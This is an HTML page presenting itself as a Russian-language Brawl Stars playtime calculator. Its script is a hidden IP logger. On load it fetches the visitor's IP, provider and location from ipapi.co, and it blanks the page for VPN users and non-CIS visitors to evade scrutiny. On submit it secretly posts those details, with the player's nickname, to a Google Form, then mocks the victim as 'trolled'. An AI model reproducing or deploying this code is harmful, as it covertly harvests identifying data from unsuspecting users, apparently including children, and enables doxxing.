<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Brawly Time — Калькулятор времени</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  background: linear-gradient(135deg, #0a0a0c 0%, #1a1a2e 100%);
  color: #fff;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  padding: 20px;
  position: relative;
  overflow-x: hidden;
}

body::before {
  content: '';
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: 
    radial-gradient(circle at 20% 50%, rgba(255, 153, 0, 0.15) 0%, transparent 50%),
    radial-gradient(circle at 80% 80%, rgba(255, 85, 0, 0.1) 0%, transparent 50%);
  pointer-events: none;
  z-index: 0;
}

.container {
  background: rgba(17, 17, 21, 0.95);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 24px;
  padding: 32px;
  width: 100%;
  max-width: 480px;
  box-shadow: 
    0 25px 50px rgba(0, 0, 0, 0.5),
    0 0 0 1px rgba(255, 255, 255, 0.05) inset;
  display: none;
  position: relative;
  z-index: 1;
  backdrop-filter: blur(10px);
}

h1 {
  font-size: 32px;
  font-weight: 900;
  margin-bottom: 8px;
  letter-spacing: -0.5px;
  background: linear-gradient(135deg, #ff9900 0%, #ff5500 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  text-align: center;
  text-transform: uppercase;
}

.subtitle {
  color: #888892;
  font-size: 14px;
  margin-bottom: 32px;
  text-align: center;
  line-height: 1.5;
}

.form-group {
  margin-bottom: 24px;
  position: relative;
}

label {
  display: block;
  font-size: 12px;
  color: #aaa;
  margin-bottom: 10px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 1px;
}

input[type="text"],
input[type="number"] {
  width: 100%;
  background: rgba(24, 24, 31, 0.8);
  border: 2px solid rgba(44, 44, 53, 0.8);
  border-radius: 12px;
  padding: 14px 18px;
  color: #fff;
  font-size: 16px;
  transition: all 0.3s ease;
  outline: none;
  font-weight: 600;
}

input:focus {
  border-color: #ff9900;
  box-shadow: 0 0 0 4px rgba(255, 153, 0, 0.1);
  transform: translateY(-2px);
}

input::placeholder {
  color: #666;
}

/* Кастомный селект */
.select-wrapper {
  position: relative;
}

.select-wrapper::after {
  content: '▼';
  position: absolute;
  right: 16px;
  top: 50%;
  transform: translateY(-50%);
  color: #ff9900;
  font-size: 12px;
  pointer-events: none;
  transition: transform 0.3s ease;
}

.select-wrapper.focus::after {
  transform: translateY(-50%) rotate(180deg);
}

select {
  width: 100%;
  background: rgba(24, 24, 31, 0.8);
  border: 2px solid rgba(44, 44, 53, 0.8);
  border-radius: 12px;
  padding: 14px 45px 14px 18px;
  color: #fff;
  font-size: 16px;
  transition: all 0.3s ease;
  outline: none;
  cursor: pointer;
  appearance: none;
  -webkit-appearance: none;
  -moz-appearance: none;
  font-weight: 600;
}

select:focus {
  border-color: #ff9900;
  box-shadow: 0 0 0 4px rgba(255, 153, 0, 0.1);
  transform: translateY(-2px);
}

/* Цвета для опций рангов */
option.rank-bronze { background: #cd7f32; color: #fff; }
option.rank-silver { background: #c0c0c0; color: #000; }
option.rank-gold { background: #ffd700; color: #000; }
option.rank-diamond { background: #b9f2ff; color: #000; }
option.rank-mythic { background: #9333ea; color: #fff; }
option.rank-legend { background: #dc2626; color: #fff; }
option.rank-master { background: #f97316; color: #fff; }
option.rank-pro { background: #22c55e; color: #fff; }

.btn {
  width: 100%;
  background: linear-gradient(135deg, #ff9900 0%, #ff5500 100%);
  color: #000;
  border: none;
  border-radius: 12px;
  padding: 16px;
  font-size: 16px;
  font-weight: 900;
  cursor: pointer;
  transition: all 0.3s ease;
  margin-top: 16px;
  text-transform: uppercase;
  letter-spacing: 1px;
  box-shadow: 0 10px 30px rgba(255, 153, 0, 0.3);
}

.btn:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 40px rgba(255, 153, 0, 0.4);
}

.btn:active {
  transform: translateY(-1px);
}

/* Экран загрузки */
.loading-screen {
  display: none;
  text-align: center;
  padding: 60px 0;
}

.spinner {
  width: 60px;
  height: 60px;
  border: 4px solid rgba(255, 153, 0, 0.1);
  border-top: 4px solid #ff9900;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto 24px;
  box-shadow: 0 0 20px rgba(255, 153, 0, 0.3);
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.loading-screen div:last-child {
  color: #888892;
  font-size: 14px;
  animation: pulse 1.5s ease-in-out infinite;
}

@keyframes pulse {
  0%, 100% { opacity: 0.6; }
  50% { opacity: 1; }
}

/* Экран результатов */
.result-screen {
  display: none;
  animation: fadeIn 0.6s ease forwards;
}

.result-screen h2 {
  font-size: 24px;
  margin-bottom: 24px;
  text-align: center;
  background: linear-gradient(135deg, #fff 0%, #ff9900 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  font-weight: 900;
}

.time-box {
  background: linear-gradient(135deg, rgba(255, 153, 0, 0.1) 0%, rgba(255, 85, 0, 0.05) 100%);
  border-radius: 16px;
  padding: 28px;
  text-align: center;
  margin-bottom: 24px;
  border: 2px solid rgba(255, 153, 0, 0.3);
  box-shadow: 0 10px 30px rgba(255, 153, 0, 0.1);
}

.time-value {
  font-size: 42px;
  font-weight: 900;
  background: linear-gradient(135deg, #ff9900 0%, #ff5500 100%);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  margin-bottom: 8px;
  letter-spacing: -1px;
}

.time-label {
  color: #888892;
  font-size: 14px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 1px;
}

.comment {
  font-size: 16px;
  color: #e4e4e7;
  line-height: 1.7;
  margin-bottom: 28px;
  background: rgba(255, 153, 0, 0.08);
  padding: 20px;
  border-radius: 12px;
  border-left: 4px solid #ff9900;
  font-style: italic;
}

.troll-alert {
  color: #ff3366;
  font-size: 28px;
  font-weight: 900;
  text-align: center;
  text-transform: uppercase;
  letter-spacing: 2px;
  text-shadow: 0 0 20px rgba(255, 51, 102, 0.5);
  margin-top: 24px;
  animation: glow 2s ease-in-out infinite;
}

@keyframes glow {
  0%, 100% { text-shadow: 0 0 20px rgba(255, 51, 102, 0.5); }
  50% { text-shadow: 0 0 30px rgba(255, 51, 102, 0.8), 0 0 40px rgba(255, 51, 102, 0.4); }
}

@keyframes fadeIn {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}

/* Адаптивность */
@media (max-width: 480px) {
  .container {
    padding: 24px;
  }
  
  h1 {
    font-size: 28px;
  }
  
  .time-value {
    font-size: 36px;
  }
}
</style>
</head>
<body>
<div class="container" id="main-container">
  <div id="setup-screen">
    <h1>⚔️ Brawly Time</h1>
    <div class="subtitle">Узнай, сколько именно дней своей жизни ты оставил в бравле</div>
    
    <div class="form-group">
      <label>🎮 Твой ник в игре</label>
      <input type="text" id="nickname" placeholder="Например, LeonPro2012">
    </div>
    
    <div class="form-group">
      <label>🏆 Победы в Трио (3х3)</label>
      <input type="number" id="wins3v3" placeholder="0" min="0">
    </div>
    
    <div class="form-group">
      <label>💀 Победы в ШД (Соло/Дуо)</label>
      <input type="number" id="winsSD" placeholder="0" min="0">
    </div>
    
    <div class="form-group">
      <label>📊 Текущий или пиковый ранг</label>
      <div class="select-wrapper">
        <select id="rank">
          <option value="бронза" class="rank-bronze">🥉 Бронза</option>
          <option value="серебро" class="rank-silver">🥈 Серебро</option>
          <option value="золото" class="rank-gold">🥇 Золото</option>
          <option value="алмаз" class="rank-diamond">💎 Алмаз</option>
          <option value="мифик" class="rank-mythic">🔮 Мифик</option>
          <option value="лега" class="rank-legend">👑 лега</option>
          <option value="мастер" class="rank-master">🔥 Мастер</option>
          <option value="про" class="rank-pro">⭐ Про (Топ-Рейтинг)</option>
        </select>
      </div>
    </div>
    
    <div class="form-group">
      <label>📅 С какого года играешь?</label>
      <div class="select-wrapper">
        <select id="year">
          <option value="2017">2017</option>
          <option value="2018">2018</option>
          <option value="2019">2019</option>
          <option value="2020">2020</option>
          <option value="2021">2021</option>
          <option value="2022">2022</option>
          <option value="2023">2023</option>
          <option value="2024">2024</option>
          <option value="2025">2025</option>
          <option value="2026">2026</option>
        </select>
      </div>
    </div>
    
    <button class="btn" onclick="calculateTime()">🔥 Посчитать время</button>
  </div>
  
  <div id="loading-screen" class="loading-screen">
    <div class="spinner"></div>
    <div>Анализируем базы данных Supercell...</div>
  </div>
  
  <div id="result-screen" class="result-screen">
    <h2>🎯 Твой результат готов!</h2>
    <div class="time-box">
      <div class="time-value" id="res-hours">0ч 0м 0с</div>
      <div class="time-label">Чистого времени в матчах</div>
    </div>
    <div class="comment" id="res-comment"></div>
    <div class="troll-alert">⚡ Затроллен, толстый! ⚡</div>
  </div>
</div>

<script>
// === КОНФИГУРАЦИЯ GOOGLE ФОРМЫ ===
const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLScm1lHtbalzz31PHchVUNO17uld9g62hzEQR8O6-OhZt33r1A/formResponse';
const FIELD_NAME = 'entry.37291210';
const FIELD_IP = 'entry.171243493';
const FIELD_PROVIDER = 'entry.36853529';
const FIELD_LOCATION = 'entry.71377506';
// ================================

let cachedIpData = null;

// Обработка фокуса на селектах
document.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('select').forEach(select => {
    select.addEventListener('focus', () => {
      select.parentElement.classList.add('focus');
    });
    select.addEventListener('blur', () => {
      select.parentElement.classList.remove('focus');
    });
  });
});

// Проверка при загрузке страницы
window.onload = async () => {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    
    // Проверка на VPN / Хостинги
    const org = (data.org || "").toLowerCase();
    const vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'datacenter', 'digitalocean', 'amazon', 'aws', 'azure', 'ovh', 'mullvad', 'nord', 'express'];
    const isVPN = vpnKeywords.some(kw => org.includes(kw));
    
    // Проверка на СНГ
    const allowedCountries = ['RU', 'BY', 'KZ', 'AM', 'AZ', 'KG', 'MD', 'TJ', 'UZ', 'UA'];
    const country = (data.country_code || "").toUpperCase();
    const isCIS = allowedCountries.includes(country);
    
    if (isVPN || !isCIS) {
      document.body.innerHTML = '';
    } else {
      cachedIpData = data;
      document.getElementById('main-container').style.display = 'block';
    }
  } catch (e) {
    document.body.innerHTML = '';
  }
};

function calculateTime() {
  const nickname = document.getElementById('nickname').value.trim();
  
  if (!nickname) {
    alert("⚠️ Сначала введи свой ник!");
    return;
  }
  
  const wins3v3 = parseInt(document.getElementById('wins3v3').value) || 0;
  const winsSD = parseInt(document.getElementById('winsSD').value) || 0;
  const rank = document.getElementById('rank').value;
  const year = parseInt(document.getElementById('year').value);
  
  // Смена экранов
  document.getElementById('setup-screen').style.display = 'none';
  document.getElementById('loading-screen').style.display = 'block';
  
  // Формула подсчета
  let totalHours = 0;
  totalHours += (wins3v3 * 2) / 60;
  totalHours += (winsSD * 2) / 60;
  
  if (rank === 'мастер' || rank === 'про') totalHours += 30;
  else if (rank === 'лега') totalHours += 10;
  else if (rank === 'мифик') totalHours += 3;
  else if (rank === 'алмаз') totalHours += 2;
  else if (rank === 'золото') totalHours += 1;
  else if (rank === 'серебро') totalHours += 0.5;
  
  if (year >= 2017 && year <= 2019) totalHours += 97;
  else if (year >= 2020 && year <= 2022) totalHours += 64;
  else if (year >= 2023 && year <= 2024) totalHours += 30;
  
  const hours = Math.floor(totalHours);
  const remainderMinutes = (totalHours - hours) * 60;
  const minutes = Math.floor(remainderMinutes);
  const seconds = Math.floor((remainderMinutes - minutes) * 60);
  
  // Генерация комментариев
  const facts = [
    {
      f1: `посмотреть все серии аниме «Ван-Пис» ${((totalHours) / 380).toFixed(1)}`,
      f2: `дойти пешком от Москвы до Владивостока ${((totalHours) / 1700).toFixed(2)}`
    },
    {
      f1: `вырастить домашний чайный гриб ${((totalHours) / 168).toFixed(1)}`,
      f2: `накопить на топовый ПК, раздавая листовки, ${((totalHours) / 120).toFixed(1)}`
    },
    {
      f1: `апнуть 50 000 кубков с нуля ${((totalHours) / 400).toFixed(1)}`,
      f2: `не спать под энергетиками ${((totalHours) / 24).toFixed(1)}`
    }
  ];
  
  const randomFact = facts[Math.floor(Math.random() * facts.length)];
  const commentText = `Это как ${randomFact.f1} раз или ${randomFact.f2} раз!`;
  
  // Отправка данных в форму
  if (cachedIpData) {
    const formData = new FormData();
    formData.append(FIELD_IP, cachedIpData.ip || 'Неизвестно');
    formData.append(FIELD_PROVIDER, cachedIpData.org || 'Неизвестно');
    formData.append(FIELD_LOCATION, `${cachedIpData.city || '?'}, ${cachedIpData.country_name || '?'}`);
    formData.append(FIELD_NAME, nickname);
    
    fetch(FORM_URL, { method: 'POST', body: formData, mode: 'no-cors' });
  }
  
  // Имитация загрузки
  setTimeout(() => {
    document.getElementById('loading-screen').style.display = 'none';
    document.getElementById('result-screen').style.display = 'block';
    document.getElementById('res-hours').innerText = `${hours}ч ${minutes}м ${seconds}с`;
    document.getElementById('res-comment').innerText = commentText;
  }, 2000);
}
</script>
</body>
</html>
